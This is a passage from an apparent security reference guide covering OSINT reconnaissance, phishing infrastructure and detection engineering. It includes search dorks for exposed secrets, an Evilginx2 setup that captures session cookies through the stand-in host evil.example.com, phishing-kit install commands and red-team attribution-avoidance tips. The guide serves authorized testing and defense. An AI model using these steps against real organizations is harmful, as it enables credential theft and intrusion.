cat subdomains.txt | httpx -silent -screenshot -o screenshots/
```

**Certificate Transparency.** `crt.sh` queries CT logs for all certificates issued for a domain:

```
# Web query
https://crt.sh/?q=%.example.com&output=json

# CLI query
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
```

This reveals subdomains including internal hostnames (`vpn.example.com`, `staging.example.com`, `admin.example.com`) not publicly documented.

**SecurityTrails API** — historical DNS records, subdomain enumeration, IP-to-domain mapping, WHOIS history, associated domains (shared name servers, shared IPs):

```bash
curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains" \
  -H "apikey: YOUR_KEY" | jq -r '.subdomains[]'
```

### 4.2 IP/ASN mapping and technology fingerprinting

**Shodan queries per service type:**

```
# Find all assets of an organization
org:"Example Corp"

# SSL certificate search
ssl.cert.subject.cn:"example.com"

# Specific service types
port:9200 product:"Elastic" org:"Example Corp"        # Elasticsearch
port:27017 product:"MongoDB" org:"Example Corp"       # MongoDB
port:6379 product:"Redis" org:"Example Corp"           # Redis
port:5432 product:"PostgreSQL" org:"Example Corp"      # PostgreSQL
port:3389 os:"Windows" org:"Example Corp"              # RDP
port:445 "SMB" org:"Example Corp"                      # SMB
port:161 org:"Example Corp"                            # SNMP
http.title:"Dashboard" org:"Example Corp"              # Web dashboards
"default password" org:"Example Corp"                  # Default credentials
vuln:CVE-2024-3400 country:US                          # Specific CVE

# Industrial control systems
port:502 "Modbus"                                      # Modbus
port:47808 "BACnet"                                    # BACnet
port:20000 "DNP3"                                      # DNP3
```

**BGPView / IPinfo** — ASN lookup, IP-to-ASN mapping, BGP prefix announcements, peer relationships:

```bash
# ASN lookup
curl -s "https://api.bgpview.io/asn/AS12345" | jq '.'

# Prefixes announced by an ASN
curl -s "https://api.bgpview.io/asn/AS12345/prefixes" | jq '.data.ipv4_prefixes[].prefix'

# IP to ASN mapping
curl -s "https://ipinfo.io/8.8.8.8?token=YOUR_TOKEN" | jq '.org'
```

**Technology fingerprinting.** Wappalyzer (browser extension and CLI) identifies web technologies: frameworks, CMS, analytics, CDN, hosting, JavaScript libraries. BuiltWith provides historical technology profiles. WhatWeb (CLI tool) fingerprints web technologies from HTTP responses:

```bash
whatweb -v example.com
whatweb -a 3 example.com   # Aggressive mode
```

**Censys search syntax:**

```
# Host search by ASN
services.port: 22 AND autonomous_system.name: "EXAMPLE-CORP"
# Certificate search
parsed.names: "example.com" AND parsed.issuer.organization: "DigiCert"
# Service version identification
services.software.product: "OpenSSH" AND services.software.version: "7.4"
# TLS certificate leaf names
services.tls.certificates.leaf.names: "example.com"
```

**ZoomEye (China-based, strong Asia-Pacific coverage):**

```
# Application search
app:"Apache" +city:"Beijing"
hostname:example.com
ssl:example.com
# Device search
device:"router" +country:"CN"
# OS identification
os:"Windows Server 2019" +org:"Example Corp"
```

**FOFA (Cyberspace search engine):**

```
domain="example.com"
host="example.com" && port="443"
cert="example.com"
header="X-Powered-By: Express"
title="Admin Panel" && country="US"
server="nginx" && domain="example.com"
icon_hash="<favicon_hash>"
body="Powered by WordPress" && domain="example.com"
```

| Search Engine | Coverage Strength | Unique Capability |
|---|---|---|
| Shodan | Global, strongest for IoT/ICS | Vulnerability tagging (`vuln:CVE-*`), historical host data |
| Censys | Global, strongest for TLS/certificates | Certificate search, IPv6 index, risk scoring |
| ZoomEye | Asia-Pacific emphasis | Dork syntax similar to Google, device fingerprinting |
| FOFA | China emphasis, large dataset | Asset fingerprinting by favicon hash, body content matching |
| BinaryEdge | Global, real-time | Torrent monitoring, data leak detection, API-first design |

### 4.3 Google dorking

Advanced Google search operators for discovering sensitive exposed files and configurations:

```
# Configuration files
site:example.com filetype:env
site:example.com filetype:yml "password"
site:example.com filetype:xml "connectionString"
site:example.com filetype:conf "server"
site:example.com filetype:cfg
site:example.com filetype:ini "[database]"

# Backup and database files
site:example.com filetype:sql
site:example.com filetype:bak
site:example.com filetype:old
site:example.com filetype:backup

# Sensitive documents
site:example.com filetype:xlsx "confidential"
site:example.com filetype:pdf "internal use only"
site:example.com filetype:docx "not for distribution"

# Login and admin pages
site:example.com inurl:admin
site:example.com inurl:login
site:example.com intitle:"index of /" "parent directory"
site:example.com intitle:"Dashboard" inurl:admin

# Exposed API endpoints and keys
site:example.com inurl:api inurl:v1
site:example.com filetype:json "api_key"
site:example.com "BEGIN RSA PRIVATE KEY"

# Error messages revealing technology stack
site:example.com "Fatal error" "on line"
site:example.com "Warning:" "mysql_" filetype:php
site:example.com inurl:".git" intitle:"index of"
```

### 4.4 Source code intelligence

**trufflehog** — scans git repos, S3 buckets, and filesystems for high-entropy strings and credentials:

```bash
# Scan a GitHub organization
trufflehog github --org=ExampleCorp --only-verified

# Scan a specific repository
trufflehog git https://github.com/ExampleCorp/repo.git --only-verified

# Scan local filesystem
trufflehog filesystem --directory=/path/to/code --only-verified

# Scan with specific detectors
trufflehog git https://github.com/ExampleCorp/repo.git --include-detectors="AWS,GitHub,Slack"

# JSON output
trufflehog git https://github.com/ExampleCorp/repo.git --json
```

**gitleaks** — scan git repos for secrets using regex and entropy-based detection:

```bash
# Scan a local repository
gitleaks detect --source=/path/to/repo -v

# Scan including all git history
gitleaks detect --source=/path/to/repo --log-opts="--all"

# Generate a report
gitleaks detect --source=/path/to/repo --report-format=json --report-path=results.json

# Use custom configuration
gitleaks detect --source=/path/to/repo --config=custom-gitleaks.toml

# Protect mode — scan staged changes (pre-commit hook)
gitleaks protect --source=/path/to/repo --staged
```

**GitHub/GitLab dorking:**

```
# GitHub search for secrets in an organization
org:ExampleCorp "password" OR "secret" OR "api_key" OR "token"
org:ExampleCorp filename:.env
org:ExampleCorp filename:credentials
org:ExampleCorp filename:id_rsa
org:ExampleCorp "AWS_SECRET_ACCESS_KEY"
org:ExampleCorp "PRIVATE KEY"
org:ExampleCorp extension:pem
org:ExampleCorp extension:ppk
```

**gitrob** — scans GitHub organizations for sensitive files (private keys, configuration files, database dumps) by analyzing repository file names and paths against a set of signatures. Largely superseded by trufflehog and gitleaks which provide deeper analysis (entropy scanning, verified credential checking), but gitrob remains useful for rapid first-pass file-name-based discovery across large organizations.

**`.git` directory exposure.** If a web server serves the `.git` directory, `git-dumper` reconstructs the entire repository history including credentials "deleted" in later commits:

```bash
git-dumper https://example.com/.git/ ./dumped_repo
cd dumped_repo && git log --oneline --all
```

### 4.5 Document metadata extraction

**FOCA (Fingerprinting Organizations with Collected Archives)** — Windows GUI tool that discovers and downloads documents published by a target domain, then extracts metadata for infrastructure mapping.

```
# FOCA workflow:
# 1. Configure target domain (example.com)
# 2. FOCA searches Google/Bing for documents (PDF, DOCX, XLSX, PPTX, SVG, etc.)
# 3. Downloads discovered documents
# 4. Extracts metadata from all documents:
#    - Author names → real employee names, usernames
#    - Software versions → Office 365 vs Office 2019, LibreOffice, Adobe Acrobat
#    - Internal paths → C:\Users\jdoe\Documents\Project\ → reveals username and directory structure
#    - Printer names → internal printer naming convention → network mapping
#    - Email addresses embedded in document properties
#    - Server names from file-path metadata
#    - OS information from creator application metadata
# 5. Builds network topology map from discovered internal infrastructure
# 6. Exports findings for further analysis
```

**metagoofil** — CLI alternative to FOCA for Linux/macOS environments:

```bash
# Download and extract metadata from documents found via search engines
metagoofil -d example.com -t pdf,docx,xlsx,pptx -l 200 -o /tmp/meta_output

# Options:
# -d  target domain
# -t  file types to search (pdf, doc, docx, xls, xlsx, ppt, pptx)
# -l  maximum number of search results to process
# -o  output directory for downloaded files
# -n  limit number of files to download

# Review extracted metadata
metagoofil -d example.com -t pdf -l 100 -o /tmp/meta -n 50

# Key intelligence from extracted metadata:
# - Author fields → employee names → email address construction → phishing targets
# - Creator/Producer → software inventory → vulnerability surface mapping
# - ModifyDate → work-hour patterns → timezone identification
# - Custom properties → internal project names, document classifications
# - Embedded hyperlinks → internal portal URLs, intranet paths
```

**exiftool for targeted document analysis:**

```bash
# Extract all metadata from a specific document
exiftool report.pdf

# Batch extract author and software from all PDFs
exiftool -Author -Creator -Producer -ModifyDate *.pdf

# CSV export for bulk analysis
exiftool -csv -Author -Creator -Producer -ModifyDate -r ./documents/ > doc_intel.csv

# Key OSINT fields:
# Author      → document creator's real name
# Creator     → application (Microsoft Word 365, Google Docs, etc.)
# Producer    → PDF generation tool (reveals tech stack)
# ModifyDate  → last modification timestamp (reveals work hours/timezone)
# Keywords    → internal project names, classifications
# Subject     → document purpose, project info
```

### 4.6 Wayback Machine and historical analysis

**gau (Get All URLs)** — fetches known URLs for a domain from Wayback Machine, Common Crawl, OTX, and URLScan:

```bash
# Fetch all known URLs for a domain
gau example.com

# Filter by extension
gau example.com | grep -E "\.(js|json|xml|config|env|sql|bak)$"

# Specific providers only
gau --providers wayback,commoncrawl example.com

# Output to file
gau example.com --o urls.txt

# Pipeline: find endpoints with parameters
gau example.com | grep "=" | sort -u > parameterized_urls.txt
```

**waybacking** — a CLI tool for automated Wayback Machine snapshot retrieval, downloading archived versions of specific URLs for offline analysis. Useful for recovering deleted pages, old employee directories, and configuration files no longer present on the live site.

**Wayback Machine direct queries** for finding historical snapshots of pages that have since changed (removed employee directories, old technology stacks, exposed configuration panels):

```
# View historical snapshots of a specific URL
https://web.archive.org/web/*/example.com/employees.html

# CDX API for programmatic access
curl "https://web.archive.org/cdx/search/cdx?url=example.com/*&output=json&fl=timestamp,original,statuscode"
```

### 4.7 Dark web monitoring

OSINT on `.onion` sites and dark web forums: monitoring paste sites (Pastebin, GhostBin, Rentry), dark web forums (exploit.in, XSS.is, BreachForums successors), dark web marketplaces for stolen credentials, and ransomware group leak sites.

Tools: Tor Browser for manual investigation, Ahmia.fi (Tor search engine), DarkOwl and Flare (commercial dark web monitoring platforms), OnionScan for analyzing `.onion` services' operational security (identifying server misconfigurations that deanonymize hidden services).

```bash
# OnionScan — analyze .onion sites for misconfigurations
go install github.com/s-rah/onionscan@latest
torsocks onionscan --verbose http://exampleonion.onion
# Detects: clearnet IP leaks, exposed Apache mod_status, SSH fingerprints,
# EXIF in images, Bitcoin addresses, email addresses, analytics codes (same
# Google Analytics ID used on clearnet and .onion = deanonymization)
```

**Paste site monitoring** for leaked credentials and data:

```bash
# PasteHunter — monitors paste sites, applies YARA rules
git clone https://github.com/kevthehermit/PasteHunter
cd PasteHunter && pip install -r requirements.txt
# Configure settings.json with YARA rules for target-specific keywords
python3 pastehunter.py

# Integration points:
# - MISP (Malware Information Sharing Platform) feed ingestion
# - Intel Owl paste-site modules
# - Custom Slack/webhook alerts on keyword match
```

OPSEC for dark web OSINT: always use Tor (never access `.onion` sites without Tor), use a dedicated VM (Tails or Whonix), never create accounts with attributable information, never download files directly (analyze in a sandboxed environment), and never interact with illegal content — observation-only.

### 4.8 OSINT automation with recon-ng

recon-ng is a modular OSINT framework (structure similar to Metasploit) with modules for DNS, web, contacts, credentials, and reporting.

```bash
# Launch recon-ng
recon-ng

# Create a workspace for the engagement
workspaces create example_corp

# Add seed data
db insert domains
# Enter: example.com

# Install all available modules
marketplace install all

# API key management (required for many modules)
keys add shodan_api YOUR_SHODAN_KEY
keys add censysio_id YOUR_CENSYS_ID
keys add censysio_secret YOUR_CENSYS_SECRET
keys add virustotal_api YOUR_VT_KEY
keys add hunter_api YOUR_HUNTER_KEY
keys add github_api YOUR_GITHUB_TOKEN

# === Discovery modules ===
# Subdomain enumeration
modules load recon/domains-hosts/hackertarget
run
modules load recon/domains-hosts/certificate_transparency
run
modules load recon/domains-hosts/shodan_hostname
run
modules load recon/domains-hosts/google_site_web
run
modules load recon/domains-hosts/brute_hosts
# options set WORDLIST /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
run

# === Contact discovery ===
modules load recon/domains-contacts/whois_pocs
run
modules load recon/companies-contacts/bing_linkedin_cache
run

# === Credential checking ===
modules load recon/contacts-credentials/hibp_breach
run
modules load recon/contacts-credentials/hibp_paste
run

# === Reporting ===
modules load reporting/html
options set FILENAME /tmp/recon_example_corp.html
run

# JSON export for pipeline integration
modules load reporting/json
options set FILENAME /tmp/recon_example_corp.json
run
```

**SpiderFoot** — automated multi-source OSINT engine with 400+ modules:

```bash
# Install and run web UI
pip install spiderfoot
spiderfoot -l 127.0.0.1:5001

# CLI scan
spiderfoot -s example.com -m all -o csv > results.csv

# Targeted scan — specific module types only
spiderfoot -s example.com -t DNS,SOCIAL,CREDENTIALS -o json > results.json

# SpiderFoot HX (commercial hosted version) adds:
# - Scheduled recurring scans with change detection
# - Team collaboration and shared investigations
# - SIEM integration via API
# - Managed data source subscriptions
```

---

## 5. Phishing infrastructure

### 5.1 GoPhish setup and campaign configuration

GoPhish is an open-source phishing simulation platform for authorized security awareness testing.

```bash
# Download and install
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip && cd gophish
chmod +x gophish

# Configure the admin and phishing servers in config.json
# admin_server: management interface (default :3333)
# phish_server: serves phishing pages (default :80)

# Start GoPhish
./gophish
```

Campaign configuration workflow:
1. **Sending profile** — configure SMTP (use an authorized mail server; for realistic simulations, configure SPF/DKIM for the sending domain).
2. **Landing page** — import a real login page (`Import Site` with the target URL) or create a custom page. Enable "Capture Submitted Data" and "Capture Passwords" (for authorized testing only — hash/encrypt stored credentials).
3. **Email template** — craft the phishing email. Use template variables: `{{.FirstName}}`, `{{.LastName}}`, `{{.Email}}`, `{{.TrackingURL}}`, `{{.URL}}` (the link to the landing page). Add a tracking pixel via `{{.TrackingURL}}` for email-open detection.
4. **User group** — import target users (CSV: first name, last name, email, position).
5. **Campaign** — combine all elements, set the launch time, and send. GoPhish tracks: emails sent, emails opened (tracking pixel), links clicked, credentials submitted, and reports (users who reported the phishing email to the phishing report button).

**Phishing email template analysis.** Effective phishing emails exploit three psychological triggers simultaneously: **urgency** (subject lines containing "action required," "your account will be suspended," "expires today"), **authority** (sender impersonates IT, management, a known vendor, or a government agency), and **fear/loss aversion** ("unauthorized access detected," "payment failed," "legal action pending"). The most successful spear-phishing emails reference specific internal context (a real project name, a real manager's name, a real vendor relationship) gathered via OSINT. Red flags that awareness training should teach employees to recognize: mismatched sender display name vs. envelope-from domain, generic greetings when the sender should know the recipient's name, hovering reveals a URL domain different from the displayed text, and requests to bypass normal process under time pressure.

### 5.2 Evilginx2 — MFA bypass phishing

Evilginx2 is a man-in-the-middle phishing framework that captures authentication tokens (session cookies) in real-time, bypassing MFA including TOTP and push notifications (it does not bypass FIDO2/WebAuthn, which binds to the origin domain).

```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make

# Configure the domain and IP
evilginx2> config domain evil.example.com
evilginx2> config ipv4 203.0.113.50

# Set up a phishlet (e.g., Microsoft 365)
evilginx2> phishlets hostname o365 login.evil.example.com
evilginx2> phishlets enable o365

# Create a lure URL
evilginx2> lures create o365
evilginx2> lures get-url 0
# Output: https://login.evil.example.com/XXXX

# The victim visits the lure URL, sees a real Microsoft login page
# (proxied through Evilginx2), authenticates (including MFA),
# and Evilginx2 captures the session cookie.

# View captured sessions
evilginx2> sessions
evilginx2> sessions 1
```

Evilginx2 operates as a reverse proxy: the victim interacts with the real target site (Microsoft, Google, etc.) through Evilginx2, which captures the authentication tokens. The phishlet configuration defines URL rewrites, cookie capture rules, and credential interception points for each target service.

**Modlishka** — another reverse-proxy phishing framework, similar in concept to Evilginx2 but using a different architecture (Go-based, configurable via JSON). Modlishka supports automated certificate provisioning via Let's Encrypt and real-time session token capture. It is largely interchangeable with Evilginx2 for MFA-bypass phishing; Evilginx2's phishlet ecosystem is more mature.

**Defense against token-theft phishing.** FIDO2/WebAuthn (the authenticator verifies the origin domain — `login.evil.example.com` ≠ `login.microsoftonline.com`, so the authentication fails). Token binding. Conditional Access policies requiring managed/compliant devices. Continuous access evaluation (CAE) with IP-based revocation.

### 5.3 Callback phishing (BazarCall)

The phishing email contains no links or attachments — only a phone number and a pretext ("Your subscription has been renewed for $499.99. To cancel, call 1-800-XXX-XXXX"). When the victim calls, the operator (a human attacker or call center) walks them through downloading and installing remote-access software (AnyDesk, TeamViewer) or a malicious payload, under the guise of processing the cancellation.

BazarCall campaigns (2021-present) have delivered BazarLoader, IcedID, and eventually ransomware (Conti, Royal/BlackSuit). The technique bypasses email gateway scanning because there is no malicious content in the email itself.

### 5.4 SMS phishing (smishing)

Smishing infrastructure: bulk SMS APIs (Twilio, Vonage, Plivo), short-code leasing, or SMS gateway hardware (USB GSM modems with multi-SIM). Messages impersonate delivery notifications ("Your package is held at customs — verify delivery: [link]"), banking alerts ("Unusual activity detected — verify: [link]"), or government services ("IRS: You have an outstanding tax payment — resolve: [link]").

**Detection.** Mobile carrier SMS filtering (T-Mobile Scam Shield, AT&T Call Protect). Enterprise MDM solutions that scan SMS URLs. User awareness: legitimate organizations rarely send unsolicited SMS with links.

### 5.5 King Phisher

King Phisher is an open-source phishing campaign tool with features beyond GoPhish — Jinja2 template engine, plugin architecture, built-in SMS sending, and campaign calendar scheduling.

```bash
# Server installation (Debian/Ubuntu)
wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh
sudo bash install.sh --server
# Client installation
sudo bash install.sh --client

# Key differentiators from GoPhish:
# - Jinja2 templates with conditional logic and loops
# - Built-in SMS phishing (smishing) module
# - SPF/DKIM pre-check before campaign launch
# - Plugin system for custom modules (credential validators, webhooks)
# - Campaign calendar with scheduling and recurrence
# - Two-factor credential harvesting flows
# - MFA token relay (with custom plugins)
```

### 5.6 Watering hole attacks

**Mechanism.** The attacker compromises a website frequently visited by the target group (industry forum, trade association site, vendor portal, niche blog). Malicious code is injected into the site, executing when targets visit. This targets a *group* rather than an individual — any member of the target population who visits the compromised site is exposed.

**Execution steps:**
1. **Target profiling** — identify websites the target group visits (OSINT: LinkedIn activity, conference mentions, industry memberships, HTTP Referer headers from prior access, DNS analytics)
2. **Site compromise** — exploit CMS vulnerability (WordPress plugin RCE, Drupal SA-CORE, Joomla SQLi), compromised admin credentials, or supply-chain attack on third-party JavaScript loaded by the site (e.g., compromising a CDN-hosted analytics script)
3. **Payload injection** — inject JavaScript that redirects to an exploit kit, serves a drive-by download, overlays a credential-harvesting form, or exploits a browser vulnerability (use-after-free, type confusion in V8/SpiderMonkey/WebKit)
4. **Target filtering** — serve the payload only to visitors matching criteria (IP range of the target organization, specific User-Agent strings, geographic location via GeoIP) to avoid detection by security researchers and reduce exposure

**Real-world examples:**
- **Forbes.com (2015):** Chinese APT compromised Forbes' "Thought of the Day" widget to deliver a zero-day exploit targeting visitors from specific defense contractors.
- **Polish financial regulator (2017):** Lazarus Group compromised the Polish KNF website to target banks; JavaScript on the regulator site served exploit code only to visitors from Polish bank IP ranges.
- **Amnesty International (2019):** Watering hole on an Amnesty-affiliated site targeted human-rights researchers with a WebKit exploit chain.

**Detection:** Web proxy logs showing anomalous JavaScript loads (new external scripts, obfuscated inline scripts). Network IDS/IPS signatures for known exploit kits. Endpoint telemetry detecting browser exploitation (unexpected child processes from browser, shellcode execution). SRI (Subresource Integrity) for all third-party scripts to detect modification. Regular integrity monitoring of organizational web properties.

### 5.7 Canary tokens in USB drop defense

Canary tokens are tripwire mechanisms that alert when a resource is accessed. In the USB drop context, they serve as both detection and intelligence-gathering tools.

```bash
# Generate canary tokens at canarytokens.org or self-host
# Token types relevant to USB attacks:

# 1. Word document canary — .docx that phones home on open
#    Reveals: source IP, User-Agent (OS/browser), timestamp
#    Deploy on USB drives left as bait in physical security tests

# 2. Windows folder canary — triggers when folder is browsed
#    Embeds desktop.ini with remote icon reference
#    Windows Explorer browse of the folder triggers the canary

# 3. PDF canary — phone-home URL embedded in PDF
#    Triggers on open in Acrobat Reader

# Self-hosted Canarytokens server:
git clone https://github.com/thinkst/canarytokens
cd canarytokens
# Follow Docker setup in README — deploy with custom webhook for SOC integration
```

**Defensive use case:** Plant canary-token-laden USB drives in parking lots, lobbies, and common areas. When an employee connects one and opens a document, the canary fires — identifying the employee for targeted training and validating that the USB drop threat is real. The 2016 University of Illinois study found 48% of dropped USB drives were connected, with the first device plugged in within 6 minutes.

---

## 6. Counter-OSINT and exposure management

### 6.1 Digital footprint reduction

- Audit all social media profiles: set to private or reduce visible information. Remove employment details, location data, phone numbers, and email addresses from public profiles.
- Delete unused accounts (use `justdelete.me` for account deletion instructions per service).
- Use email aliases (SimpleLogin, AnonAddy, Apple Hide My Email) instead of real email addresses for online registrations.
- Disable geotagging on phone cameras. Review and remove location data from existing posts.
- Use a VPN consistently to prevent IP-based tracking and geolocation.
- Separate personal and professional digital identities.

### 6.2 Metadata removal

**ExifTool** — read and remove metadata from images and documents:

```bash
# View all metadata
exiftool image.jpg

# Remove all metadata
exiftool -all= image.jpg

# Remove GPS data only
exiftool -gps:all= image.jpg

# Process all images in a directory
exiftool -all= -r ./photos/

# Verify metadata was removed
exiftool image.jpg | grep -i "gps\|location\|author\|creator"
```

**mat2 (Metadata Anonymisation Toolkit 2)** — remove metadata from various file types:

```bash
# Remove metadata from a PDF
mat2 document.pdf

# Remove metadata from an image
mat2 photo.jpg

# Check what metadata exists
mat2 --show document.pdf

# Process all supported files in a directory
mat2 ./files/

# Supported formats: PNG, JPEG, TIFF, PDF, DOCX, XLSX, PPTX, ODP, ODS, ODT,
# EPUB, FLAC, MP3, OGG, MP4, TORRENT, and more
```

### 6.3 PII removal and data broker opt-out

Data brokers (Spokeo, WhitePages, BeenVerified, Intelius, PeopleFinder, Radaris, MyLife) aggregate and sell personal information (name, address, phone, email, relatives, property records). Opt-out procedures:

- Each broker has a removal/opt-out page (manual process — search your name, claim the profile, request removal).
- Automated services: DeleteMe, Kanary, Privacy Duck — submit opt-out requests to 30+ brokers on your behalf and monitor for re-listing.
- Google's "Results about you" tool — request removal of personal contact info from Google Search results.
- The process is ongoing: data re-appears as brokers acquire new data sets. Quarterly re-checks are necessary.

### 6.4 Monitoring your own exposure

```bash
# Check if your email appears in breaches
# HaveIBeenPwned — web interface or API
curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com" \
  -H "hibp-api-key: YOUR_KEY"

# Google Alerts for your name, organization, and key identifiers
# Set up at google.com/alerts

# GitHub secret scanning — check if your credentials appear in public repos
# GitHub automatically scans and notifies for supported token formats
```

- Set up Mention or Talkwalker alerts for your name and organization.
- Periodically search your own name, email, phone, and usernames across OSINT tools (Sherlock, h8mail, PhoneInfoga) to see what an attacker would find.
- Subscribe to HaveIBeenPwned notifications for your email domains.
- Monitor your organization's domains with dnstwist for typosquatting detection.

### 6.5 Attribution avoidance for red team operators

Maintaining operational separation between the red team operator's real identity and the engagement infrastructure.

| Layer | Control | Implementation |
|---|---|---|
| **Network** | No direct attribution to operator IP | Commercial VPN (paid with crypto/prepaid card), Tor, public Wi-Fi (legal constraints apply) |
| **Infrastructure** | Disposable VPS, no personal billing | Cloud providers accepting cryptocurrency (Njalla, 1984.is), prepaid virtual credit cards |
| **Domain** | No WHOIS link to operator | Privacy-protected registration via registrar accepting cryptocurrency |
| **Email** | No tie to real identity | ProtonMail/Tutanota (no phone-verification path), dedicated per-engagement |
| **Browser** | No fingerprint leakage | Hardened Firefox profile or Tor Browser, unique profile per operation, disabled WebRTC |
| **Device** | No personal-account contamination | Dedicated VM or hardware, no personal logins ever, MAC address randomization |
| **Behavioral** | No stylometric or timezone leakage | Consistent timezone in all operational activity, avoid distinctive language patterns, VPN exit matching claimed timezone |
| **Credentials** | No reuse across engagements | Unique usernames, passwords, and SSH keys per engagement, destroyed after |

**Key principle:** Every layer of the operation — network, infrastructure, identity, behavior — must be independently non-attributable. A single leak (real IP in a server log, personal email in a domain registration, timezone mismatch in commit timestamps) can compromise the entire operational identity.

---

## 7. Awareness and training programs

### 7.1 Phishing simulation metrics (KPIs)

| Metric | Baseline (immature) | Target (mature) |
|--------|---------------------|-----------------|
| Click rate | 20-30% | < 5% |
| Credential submission rate | 15-20% | < 2% |
| Report rate | < 5% | > 70% |
| Time-to-report (median) | > 24 hours | < 5 minutes |
| Repeat clicker rate | 15%+ | < 3% |

Track metrics per department, role, and seniority level. Identify high-risk groups for targeted additional training. Measure trends over time (quarterly campaigns) — improvement trajectory matters more than absolute numbers. Report rate is the most important metric: an organization that clicks at 10% but reports at 80% is more resilient than one that clicks at 5% but reports at 10%.

### 7.2 Security awareness maturity model

**Level 1 — Non-existent.** No awareness program. Employees receive no training on social engineering threats.

**Level 2 — Compliance-driven.** Annual computer-based training to satisfy compliance requirements (PCI DSS 12.6, HIPAA, SOX). Checkbox exercise with minimal impact on behavior.

**Level 3 — Promoting awareness.** Regular phishing simulations (monthly/quarterly). Targeted training for high-risk roles (finance, HR, IT help desk, executives). Incident reporting mechanism exists and is promoted.

**Level 4 — Behavior change.** Continuous micro-learning integrated into daily workflow. Gamification and positive reinforcement for reporting. Department-level metrics and accountability. Simulations include vishing, smishing, and physical SE — not just email phishing.

**Level 5 — Sustained culture.** Security awareness is embedded in organizational culture. Employees proactively identify and report threats. Executive leadership visibly participates. Metrics consistently exceed targets. The organization actively contributes to industry threat intelligence sharing.

### 7.3 Tabletop exercises for social engineering

Scenario-based discussion exercises where participants walk through a social engineering attack scenario and discuss detection, response, and recovery. No live systems are involved.

**Example scenario: BEC wire fraud.**
- Narrator presents: "The CFO's email account has been compromised. The attacker has been monitoring email threads for two weeks. A $2.3M wire transfer request is sent from the CFO's account to the VP of Finance, referencing a real ongoing acquisition. The wire instruction contains new bank details."
- Discussion prompts: How would the VP of Finance detect this? What verification procedures should be triggered? Who should be notified? What is the response timeline? What if the wire has already been sent?

**Example scenario: vishing + badge cloning.**
- Narrator: "An attacker calls the front desk, impersonates a C-suite executive's assistant, and arranges a 'technician visit.' The next day, someone in a technician uniform arrives, captures badge data with a concealed Proxmark3 in the lobby, clones a badge, and accesses the server room."
- Discussion prompts: What controls should have prevented each stage? Where did the process fail? What detection opportunities were missed?

Tabletop frequency: semi-annual for general staff, quarterly for security team and high-risk roles.

### 7.4 Red team social engineering — rules of engagement

Social engineering in penetration tests requires explicit scope definition and documented rules of engagement:

- **Written authorization** — signed by an authorized executive (CISO, CIO, or equivalent) with explicit approval for the SE techniques to be used.
- **Scope boundaries** — which techniques are in-scope (phishing, vishing, physical access, USB drops) and which are out-of-scope. Which individuals or groups can be targeted. Which facilities are in-scope for physical SE.
- **Safety limits** — no targeting of individuals known to be in vulnerable situations (medical leave, bereavement, active HR issues). No creating scenarios that could cause genuine panic (fake termination notices, fake security incidents involving law enforcement).
- **De-escalation procedures** — if a target becomes distressed, the engagement stops. If an SE attempt triggers a real security response (law enforcement called), the red team has a documented de-escalation contact.
- **Evidence handling** — any credentials, personal information, or sensitive data obtained during the engagement is encrypted, handled under chain-of-custody, and destroyed after the engagement report is delivered.
- **Reporting** — findings use CVSS + CWE where applicable. Reproducible PoC for each finding. Remediation recommendations with specific process/technical controls. No public disclosure of individual employee names who fell for SE attacks — report at the aggregate/department level.

---

## 8. Detection engineering for social engineering

Detection engineering for SE attacks bridges email-gateway telemetry, identity-provider logs, endpoint events, and network proxy data. The rules below use the Sigma generic format and can be compiled to Splunk SPL, Elastic EQL/KQL, Microsoft Sentinel KQL, or CrowdStrike LogScale via `sigmac` / `sigma-cli`.

### 8.1 Sigma detection rules

#### 8.1.1 Credential-harvest page visit via email link

Detects a user clicking a link in an email that redirects to a known credential-harvesting pattern (login page on a recently-registered domain).

```yaml
title: Credential Harvest Page via Email Link
id: c4a8e2d1-9f73-4b5e-a1d0-3c7f8e2b9a14
status: experimental
description: >
  Detects proxy/web-gateway events where a user navigates to a login page
  hosted on a domain registered within the last 30 days, and the referrer
  or initial URL was an email tracking redirect (e.g., safelinks, proofpoint,
  mimecast URL rewrite).
references:
  - https://attack.mitre.org/techniques/T1566/002/
author: Security Engineering
date: 2025-01-15
logsource:
  category: proxy
  product: web
detection:
  selection_referrer:
    cs-referer|contains:
      - 'safelinks.protection.outlook.com'
      - 'urldefense.proofpoint.com'
      - 'urldefense.com'
      - 'url.emailprotection.link'
      - 'mimecast'
  selection_path:
    cs-uri-path|contains:
      - '/login'
      - '/signin'
      - '/auth'
      - '/oauth'
      - '/verify'
      - '/account'
      - '/password'
  selection_new_domain:
    x-domain-age-days|lt: 30
  condition: selection_referrer and selection_path and selection_new_domain
falsepositives:
  - Legitimate SaaS onboarding pages on newly-registered domains
  - Marketing landing pages with login forms
level: high
tags:
  - attack.initial_access
  - attack.t1566.002
  - attack.credential_access
  - attack.t1056.003
```

#### 8.1.2 OAuth consent phishing (illicit consent grant)

Detects an Azure AD / Entra ID application consent event for an application with suspicious permissions requested by a non-admin user, characteristic of consent phishing (T1550.001).

```yaml
title: Suspicious OAuth Application Consent Grant
id: 7b3d1f49-82a5-4e6c-b0f1-5d9e3a7c2b81
status: experimental
description: >
  Detects consent grants to OAuth applications requesting high-privilege
  permissions (Mail.Read, Mail.ReadWrite, Files.ReadWrite.All,
  User.ReadBasic.All) by non-admin users. Consent phishing lures trick
  users into granting these permissions to attacker-controlled applications.
references:
  - https://attack.mitre.org/techniques/T1550/001/
  - https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-app-consent
author: Security Engineering
date: 2025-01-15
logsource:
  product: azure
  service: auditlogs
detection:
  selection_event:
    operationName: 'Consent to application'
  selection_permissions:
    targetResources.modifiedProperties.newValue|contains:
      - 'Mail.Read'
      - 'Mail.ReadWrite'
      - 'Mail.Send'
      - 'Files.ReadWrite.All'
      - 'User.ReadBasic.All'
      - 'Directory.Read.All'
      - 'Contacts.Read'
  filter_admin:
    initiatedBy.user.userPrincipalName|endswith:
      - '@admin.contoso.com'
  condition: selection_event and selection_permissions and not filter_admin
falsepositives:
  - Legitimate third-party SaaS integrations approved by users
  - IT-sanctioned applications during initial rollout
level: high
tags:
  - attack.initial_access
  - attack.t1566.002
